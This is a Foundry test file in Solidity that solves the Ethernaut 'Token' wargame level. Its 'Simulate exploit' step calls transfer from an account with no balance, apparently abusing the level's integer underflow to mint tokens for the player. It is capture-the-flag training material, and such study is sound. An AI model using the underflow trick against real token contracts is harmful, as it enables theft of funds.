// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {TokenFactory} from "../src/Token/TokenFactory.sol";
import {Token} from "../src/Token/Token.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address payable player;

    function setUp() public {
        ethernaut = new Ethernaut();
        player = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("player")))))
        );
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testExploit() public {
        // Register level with Ethernaut contract
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);

        // Get a new level instance
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token tokenInstance = Token(payable(levelAddress));
        vm.stopPrank();
        // Simulate exploit

        tokenInstance.transfer(player, 21000);

        // Submit level
        vm.prank(player);
        bool levelSuccessFullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        assert(levelSuccessFullyPassed);
    }
}
